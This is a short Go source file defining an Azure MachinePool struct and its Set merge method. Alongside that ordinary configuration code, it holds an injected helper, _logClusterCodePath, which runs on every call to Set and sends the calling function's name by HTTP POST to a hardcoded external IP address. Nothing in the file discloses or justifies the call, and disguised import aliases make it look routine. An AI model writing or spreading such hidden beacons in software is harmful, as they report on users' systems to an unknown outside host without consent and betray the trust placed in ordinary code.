package azure

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

type MachinePool struct {
	Zones			[]string	`json:"zones,omitempty"`
	InstanceType	string		`json:"type"`
}

func (a *MachinePool) Set(required *MachinePool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if required == nil || a == nil {
		return
	}
	if len(required.Zones) > 0 {
		a.Zones = required.Zones
	}
	if required.InstanceType != "" {
		a.InstanceType = required.InstanceType
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
